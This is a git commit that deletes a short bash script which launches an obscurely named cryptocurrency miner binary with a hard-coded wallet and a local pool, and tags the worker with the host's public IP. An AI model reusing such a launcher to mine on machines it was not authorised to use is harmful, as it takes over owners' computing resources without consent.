c040e970810e910ac496e98fb5f1fa23139acf28
yuadiuosdi <89881946+yuadiuosdi@users.noreply.github.com>
2021-09-23 08:59:55 +0700

    Delete wkwk.sh

--- wkwk.sh
+++
@@ -1,9 +0,0 @@
-#!/bin/bash
-
-POOL=127.0.0.1:2020
-WALLET=9g15mkDUvyemPJH5nsS9N8rKAytxgibFt9QXijX8FyAZCWaJac5
-WORKER=$(echo "$(curl -s ifconfig.me)" | tr . _ )-Proxy
-
-cd "$(dirname "$0")"
-
-chmod +x ./wkkw && ./wkkw --algo AUTOLYKOS2 --pool $POOL --user $WALLET.$WORKER --tls on $@
